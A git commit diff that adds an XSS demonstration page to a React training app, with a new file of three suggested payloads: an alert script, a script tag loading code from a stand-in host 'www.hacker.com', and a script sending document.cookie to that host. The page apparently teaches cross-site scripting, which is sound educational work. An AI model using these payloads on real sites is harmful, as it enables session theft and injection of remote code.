2f4df35c034e2afbc5ec96cf28b8585eaa49f345
Haixiang <haixiang6123@gmail.com>
2019-04-24 10:38:11 -0700

    Add XSS layout

--- src/pages/XSS/XSS.js
+++ src/pages/XSS/XSS.js
@@ -1,10 +1,38 @@
 import React, {Component} from 'react'
+import {Row, Col, Divider, Table, Input} from "antd"
+import {db, columns} from './db'
+import {alertCode, outsideCode, stealCookie} from "./codes"
+
+const Search = Input.Search
 
 class XSS extends Component {
     render() {
         return (
-            <div className="xss">
-                xss
+            <div>
+                <h1 style={{textAlign: 'center'}}>Review Module (XSS Attack)</h1>
+                <Row gutter={16} type="flex" justify="center">
+                    {/*Left*/}
+                    <Col span={8}>
+                        <Divider>Frontend</Divider>
+                        <p>Try following keyword to break the frontend</p>
+                        <ul>
+                            <li>{alertCode}</li>
+                            <li>{outsideCode}</li>
+                            <li>{stealCookie}</li>
+                        </ul>
+
+                        <Search
+                            placeholder="Enter a movie review"
+                            onSearch={value => console.log(value)}
+                            enterButton="Add Review"
+                        />
+                    </Col>
+                    {/*Right*/}
+                    <Col span={8}>
+                        <Divider>Backend: 'review' Database</Divider>
+                        <Table dataSource={db} columns={columns}/>
+                    </Col>
+                </Row>
             </div>
         )
     }
---
+++ src/pages/XSS/codes.js
@@ -0,0 +1,3 @@
+export const alertCode = `<script>alert("You are hack!")</script>`
+export const outsideCode = `<script src="www.hacker.com/main.js"></script>`
+export const stealCookie = `<script>sendHTTPRequest("www.hacker.com", document.cookie)</script>`
